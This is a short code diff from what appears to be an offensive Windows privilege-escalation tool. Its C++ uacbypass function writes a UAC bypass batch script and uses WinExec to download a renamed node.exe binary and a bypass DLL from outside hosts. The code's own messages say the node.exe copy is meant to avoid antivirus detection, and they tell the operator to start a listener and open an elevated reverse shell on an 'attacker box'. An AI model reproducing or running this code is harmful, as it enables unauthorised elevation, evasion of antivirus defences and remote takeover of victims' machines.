@@ -786,9 +786,9 @@ void uacbypass()
     uacbyppayload.close();
     cout << "uac byp@ss script created! It's located at: C:\\users\\public\\elevateit.bat\n";
     cout << "Downloading necessary scripts...\n";
-    printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV detection (takes ~2 min to download);)\n");
-    WinExec("powershell Invoke-WebRequest -Uri \"https://nodejs.org/download/release/latest/win-x64/node.exe\" -OutFile \"c:\\users\\public\\n0de.exe\"", 0); //download directly from nodejs file repo
-    WinExec("powershell Invoke-WebRequest -Uri \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\" -OutFile \"c:\\temp\\netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
+    printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV detection ;)\n");
+    WinExec("curl -L -o \"c:\\users\\public\\n0de.exe\" \"https://nodejs.org/download/release/latest/win-x64/node.exe\"", 0); //download directly from nodejs file repo
+    WinExec("curl -L -o \"c:\\temp\\netutils.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
     cout << "while waiting for download to finish, go ahead and start your listener on your attacker box\n";
     cout << "You can see the progress of the download in your foothold reverse shell ;)  hit [enter] when it's finished to pop your elevated shell!\n";
     cin.get();
